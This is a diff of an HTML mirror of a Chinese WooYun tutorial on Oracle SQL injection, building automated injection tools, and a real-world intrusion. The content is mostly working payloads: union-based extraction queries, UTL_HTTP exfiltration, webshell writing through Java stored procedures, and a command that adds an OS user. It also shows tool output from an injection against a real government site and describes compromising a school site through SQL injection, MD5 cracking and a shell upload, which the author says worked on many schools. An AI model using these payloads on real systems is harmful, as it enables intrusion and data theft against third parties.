@@ -3,28 +3,28 @@
 			<head>
 			     <title>攻击JavaWeb应用[4]-SQL注入[2] - 园长</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/288">http://drops.wooyun.org/tips/288</a></h1>
 				
       <p>
-        <h4>注:这一节主要是介绍Oracle和SQL注入工具相关，本应该是和前面的Mysql一起但是由于章节过长了没法看，所以就分开了。</h4>
+        </p><h4>注:这一节主要是介绍Oracle和SQL注入工具相关，本应该是和前面的Mysql一起但是由于章节过长了没法看，所以就分开了。</h4>
 
 <p><br></p>
 
 <h3>0x00 Oracle</h3>
 
-<hr />
+<hr>
 
 <p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。</p>
 
 <p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。这一次我们依旧使用上面的代码，数据库结构平移到Oracle上去，数据库名用的默认的orcl，字段"corps_desc" 从text改成了VARCHAR2(4000)，JSP内的驱动和URL改成了对应的Oracle。
 ￼<!--more-->
-<img src="http://static.wooyun.org/20140918/2014091811125084186.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125084186.png" alt="enter image description here"></p>
 
 <p>Jsp页面代码：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125160382.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125160382.png" alt="enter image description here"></p>
 
 <p>开始注入：</p>
 
@@ -34,18 +34,18 @@
 
 <p>分别提交<code>http://localhost/SqlInjection/index.jsp?id=1 AND 1=1</code> 和<code>?id=1 AND 1=12</code> 得到的页面明显不一致，1=12页面没有任何数据，即1=12为false没查询到任何结果。
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125148605.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125148605.png" alt="enter image description here"></p>
 
 <pre><code>http://localhost/SqlInjection/index.jsp?id=1 AND 1=12
 </code></pre>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811125139981.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811125139981.png" alt="enter image description here"></p>
 
 <p>提交：<code>http://localhost/SqlInjection/index.jsp?id=1 ORDER BY 4--</code> 页面正常，提交：<code>?id=1 ORDER BY 5--</code>报错说明字段数肯定是4。</p>
 
 <p><code>Order by 5</code>爆出的错误信息：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125219165.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125219165.png" alt="enter image description here"></p>
 
 <h4>使用union 进行联合查询：</h4>
 
@@ -65,7 +65,7 @@
 <pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 1,2,NULL,NULL FROM dual--
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811125376525.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811125376525.png" alt="enter image description here"></p>
 
 <p>Oracle当中正确的注入方式用NULL去占位在我们未知哪个字段是什么类型的时候：</p>
 
@@ -79,13 +79,13 @@
 
 <p>SQL执行后的占位效果：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125320140.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125320140.png" alt="enter image description here"></p>
 
 <p>根据我们之前注入Mysql的经验，我们现在要尽可能多的去获取服务器信息和数据库，比如数据库版本、权限等。</p>
 
 <p>在讲Mysql注入的时候已经说道要合理利用工具，在Navicat客户端执行<code>select * from session_roles</code>结果：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125399069.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125399069.png" alt="enter image description here"></p>
 
 <h5>Oracle查询分页tips：</h5>
 
@@ -94,7 +94,7 @@
 <pre><code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;= 0 
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811125412884.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811125412884.png" alt="enter image description here"></p>
 
 <p>在Oracle里面没有类似于Mysql的group_concat,用分页去取数据，不过有更加简单的方法。</p>
 
@@ -103,13 +103,13 @@
 <pre><code>http://localhost/SqlInjection/index.jsp?id=1 UNION ALL SELECT NULL, NULL, NULL, NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32)) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811125518178.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811125518178.png" alt="enter image description here"></p>
 
 <p>￼不过我得告诉你，UNION SELECT查询返回的是多个结果，而在正常的业务逻辑当中我们取一条新闻是直接放到对应的实体当中的，比如我们查询的wooyun的厂商表：corps，那么我们做查询的很有可能是抽象出一个corps对象，在DAO层取得到单个的参数结果集，如果有多个要么报错，要么取出第一条。然后再到controller层把查询的结果放到请求里面。最终在输出的时候自然也就只能拿到单个的corps实体，这也是视图层只做展示把业务逻辑和视图分开的好处之一，等讲到MVC的时候试着给不懂的朋友解释一下。</p>
 
 <p>再来看一下我们丑陋的在页面展示数据的代码：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125514136.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125514136.png" alt="enter image description here"></p>
 
 <p>接下来的任务就是收集信息了，上面我们已经收集到数据库所有的用户的用户名和我们当前用户的权限。</p>
 
@@ -120,11 +120,11 @@
 
 <p>连接符我用的是-转换成编码也就是45
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125685638.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125685638.png" alt="enter image description here"></p>
 
 <p>已列举出所有的表名：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125685506.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125685506.png" alt="enter image description here"></p>
 
 <p>当UNION ALL SELECT 不起作用的时候我们可以用上面的Oracle分页去挨个读取，缺点就是效率没有UNION ALL SELECT高。</p>
 
@@ -133,7 +133,7 @@
 <pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT NULL, NULL, NULL, (select banner from sys.v_$version where rownum=1) from dual—
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811125791325.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811125791325.png" alt="enter image description here"></p>
 
 <p>获取启动Oracle的用户名:</p>
 
@@ -174,9 +174,9 @@
 
 <p>上述SQL通过添加Where条件就能获取到常见注入的敏感信息，请有心学习的同学按照上面的MYSQL注入时通过information_schema获取敏感字段的方式去学习user_tab_columns和FROM  User_tables表。
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125741789.png" alt="enter image description here" />
+<img src="http://static.wooyun.org/20140918/2014091811125741789.png" alt="enter image description here">
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125719030.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125719030.png" alt="enter image description here"></p>
 
 <h4>Oracle高级注入：</h4>
 
@@ -191,11 +191,11 @@
 
 <p>UTL_HTTP 会带着查询数据库的结果去请求我们的URL，也就是我注入点上写的URL。Tips：UTL_HTTP是一条一条的去请求的，所以会跟数据库保持一个长连接。而数据量过大的话会导致数据丢失，如果想完整的友情备份这种方法并不是特别可行。只用在浏览器上请求这个注入点Oracle会自动的把自己的裤子送上门来那种感觉非常的好。</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811125884880.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811125884880.png" alt="enter image description here"></p>
 
 <p>使用UTL_HTTP友情备份效果图：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125836606.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125836606.png" alt="enter image description here"></p>
 
 <p>utl_http在注入的时候怎么去利用同理，由于我也没有去深入了解utl_http或许他还有其他的更实用的功能等待你去发现。</p>
 
@@ -222,7 +222,7 @@
 
 <p>效果图：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811125976571.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811125976571.png" alt="enter image description here"></p>
 
 <h5>GetShell</h5>
 
@@ -232,7 +232,7 @@
 
 <p>（当然用户必须的具有创建DIRECTORY的权限）:</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811125917638.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811125917638.png" alt="enter image description here"></p>
 
 <p>执行：</p>
 
@@ -260,11 +260,11 @@
 /
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130049319.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130049319.png" alt="enter image description here"></p>
 
 <p>在低权限下getshell：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130096010.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130096010.png" alt="enter image description here"></p>
 
 <p>执行以下SQL创建表空间：</p>
 
@@ -288,7 +288,7 @@ drop tablespace shell including contents;
 
 <p>SQLJ可以这样玩：首先创建一个类提供一个静态方法：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130033274.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130033274.png" alt="enter image description here"></p>
 
 <p>其中的getShell是我们的方法名，p和才是参数，p是路径，而c是要写的文件内容。在创建Java存储过程的时候方法类型必须是静态的static</p>
 
@@ -332,7 +332,7 @@ grant javauserpriv to system;
 <pre><code>exec :x:=getShell('d:/3.txt','selina');
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130115819.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130115819.png" alt="enter image description here"></p>
 
 <h5>SQLJ执行cmd命令：</h5>
 
@@ -372,7 +372,7 @@ language java name 'Execute.executeCmd(java.lang.String)';
 <pre><code>exec executeCmd('net user selina 123 /add');
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130130874.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130130874.png" alt="enter image description here"></p>
 
 <p>上面提供的命令执行和getshell创建方式对换一下就能回显了，如果好不清楚怎么让命令执行后回显可以参考：</p>
 
@@ -385,7 +385,7 @@ language java name 'Execute.executeCmd(java.lang.String)';
 
 <h3>0x01 自动化的SQL注入工具实现</h3>
 
-<hr />
+<hr>
 
 <p>通过上面我们对数据库和SQL注入的熟悉，现在可以自行动手开发注入工具了吧？</p>
 
@@ -564,7 +564,7 @@ skey:id=148
 
 <pre><code>url:http://www.tchjbh.gov.cn/news_display.php
 param:id=148-1+UnIon+SeleCt+concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]')%23
-user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5723343f3d353f17666560796779677966">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5723343f3d353f17666560796779677966">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 version:5.1.56-community
 database:tchjbh
 </code></pre>
@@ -573,11 +573,11 @@ database:tchjbh
 
 <h3>0x02 模拟SQL注入分析注入工具原理</h3>
 
-<hr />
+<hr>
 
 <p>下面这个演示是针对想自己拓展上面写的SQL注入工具的同学。这次我才用的是PHP语言去弄清SQL注入工具的具体实现。数据库采用的是wordpress的结构，数据库结构如下,建议在本地先安装好wordpress任意版本：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130268261.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130268261.png" alt="enter image description here"></p>
 
 <p>代码如下：</p>
 
@@ -625,17 +625,17 @@ database:tchjbh
 
 <p>建立好数据库和表之后访问（由于我采用的是自己的wp博客，所有有大量的测试数据如果没有数据建议安装个wordpress方便以后的测试）：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130266949.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130266949.png" alt="enter image description here"></p>
 
 <p>SQL注入测试：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130330937.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130330937.png" alt="enter image description here"></p>
 
 <p>让我们来看下m4xmysql究竟在SQL注入点提交了那些数据,点击start我们的PHP程序会自动在同目录下生成一个getsql.txt打开后发现我们截获到如下SQL：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130390176.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130390176.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130360925.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130360925.png" alt="enter image description here"></p>
 
 <p>看起来不算多，因为我没有自动换行，以上是在获取数据库相关信息。</p>
 
@@ -662,7 +662,7 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b68345d,0,
 
 <p>以上的SQL完成了注入点（<code>http://localhost/Test/1.php?id=739</code>执行的<code>SELECT * from wps_posts where ID = 739</code>）的类型、是否存在和字段数量的检测   里面有许多的0x5b2f68345d转换过来其实就是占位符，为了让工具扒下源代码后能够在页面类找到具有特殊意义的字符并进行截取：</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130498784.png" alt="enter image description here" />
+<p><img src="http://static.wooyun.org/20140918/2014091811130498784.png" alt="enter image description here">
 ￼
 如果你足够聪明或仔细会发现他这样写有点浪费资源，因为他的order 是从1一直递增到争取的长度的假如字段特别长（一般情况下还是很少出现的）可能要执行几十个甚至是更多的HTTP请求，如果这里使用二分法或许可以很好的解决吧。</p>
 
@@ -674,18 +674,18 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,da
 
 <p>这玩意到底是什么神秘的东西呢？我们不妨在Navicat和FireFox里面瞅瞅：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130474362.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130474362.png" alt="enter image description here"></p>
 
 <p>FireFox执行的结果：</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130421307.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130421307.png" alt="enter image description here"></p>
 
 <p>让我们来还原上面的那句废话：</p>
 
 <pre><code>select file_priv from mysql.user where user=root
 </code></pre>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130547389.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130547389.png" alt="enter image description here"></p>
 
 <p>上面很长很臭的SQL翻译过来就这么短的一句查询的结果就一个得到的信息就是：</p>
 
@@ -696,7 +696,7 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,da
 <pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d)--
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130514343.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130514343.png" alt="enter image description here"></p>
 
 <p>/*[h4ckinger]asim[/h4ckinger] 这段SQL看不出来有什么实际意义，没有对数据库进行任何操作。对应的SQL是：</p>
 
@@ -734,29 +734,29 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,da
 
 <h3>0x03 简单实战</h3>
 
-<hr />
+<hr>
 
 <p>本次实战并没有什么难度，感觉找一个能把前面的都串起来的demo太难了。本次实战的目标是某中学，网站使用JavaWeb开发。去年的时候通过POST注入绕过了GET的防注入检测。对其和开发商的官网都做了SQL注入检测，然后加了开发商的QQ通知修补。</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130530473.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130530473.png" alt="enter image description here"></p>
 
 <p>前不久再去测试的时候发现漏洞已经被修补了，围观了下开发商后发现其用的是glassfish：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130623915.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130623915.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130624483.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130624483.png" alt="enter image description here"></p>
 
 <p>尝试从服务器弱口令入口了入手但是失败了glassfish的默认管理帐号是admin密码是adminadmin，如果能过登录glassfish的后台可以直接部署一个war去getshell。
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130729542.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130729542.png" alt="enter image description here"></p>
 
 <p>由于没有使用如Struts2之类的MVC框架所以google了下他的jsp，-News参数表示不希望在搜索结果中包含带有-News的结果。
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130726799.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130726799.png" alt="enter image description here"></p>
 
 <p>通过GOOGLE找到一处flash上传点，值得注意的是在项目当中上传下载一般作为一个共有的业务，所以可能存在一致性也就是此处要是上传不成功恐怕到了后台也不会成功。企图上传shell：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811130832662.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811130832662.png" alt="enter image description here"></p>
 
 <p>上传文件：</p>
 
@@ -773,11 +773,11 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,da
 &lt;/html&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811130933678.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20140918/2014091811130933678.png" alt="enter image description here"></p>
 
 <p>好吧支持txt.html.exe什么的先来个txt：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811130912438.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811130912438.png" alt="enter image description here"></p>
 
 <p>一般来说我比较关注逻辑漏洞，比如找回密码，查看页面源码后还真就发现了点猫腻有DWR框架。</p>
 
@@ -785,25 +785,25 @@ SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,da
 
 <p>DWR就是一个奇葩，人家都是想着怎么样去解耦，他倒好直接把js和后端java给耦合在一起了。DWR（Direct Web Remoting）是一个用于改善web页面与Java类交互的远程服务器端Ajax开源框架，可以帮助开发人员开发包含AJAX技术的网站。它可以允许在浏览器里的代码使用运行在WEB服务器上的JAVA方法，就像它就在浏览器里一样。</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811131018169.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811131018169.png" alt="enter image description here"></p>
 
 <p>再次利用chrome抓网络请求，居然发现后台把用户的密码都给返回了，这不科学啊：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811131025003.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811131025003.png" alt="enter image description here"></p>
 
 <p>与此同时我把google到的动态连接都打开，比较轻易的就发现了一处SQL注入漏洞，依旧用POST提交吧，以免他的防注入又把我拦截下来了（再次提醒普通的防注入普遍防的是GET请求，POST过去很多防注入都傻逼了,Jsp里面request.getParameter("parameter")GET和POST方式提交的参数都能过获取到的）：
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811131144227.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811131144227.png" alt="enter image description here"></p>
 
 <p>破MD5，进后台改上传文件扩展名限制拿shell都一气呵成了：</p>
 
-<p>￼<img src="http://static.wooyun.org/20140918/2014091811131127199.png" alt="enter image description here" /></p>
+<p>￼<img src="http://static.wooyun.org/20140918/2014091811131127199.png" alt="enter image description here"></p>
 
 <p>GETSHELL:
 ￼
-<img src="http://static.wooyun.org/20140918/2014091811131299884.png" alt="enter image description here" /></p>
+<img src="http://static.wooyun.org/20140918/2014091811131299884.png" alt="enter image description here"></p>
 
-<p>可能实战写的有点简单了一点，凑合这看吧。由于这是一套通用系统，很轻易的通过该系统漏洞拿到很多学校的shell，截图中可能有漏点，希望看文章的请勿对其进行攻击！</p>      </p>
+<p>可能实战写的有点简单了一点，凑合这看吧。由于这是一套通用系统，很轻易的通过该系统漏洞拿到很多学校的shell，截图中可能有漏点，希望看文章的请勿对其进行攻击！</p>      <p></p>
     
 			</body>
 		</html>
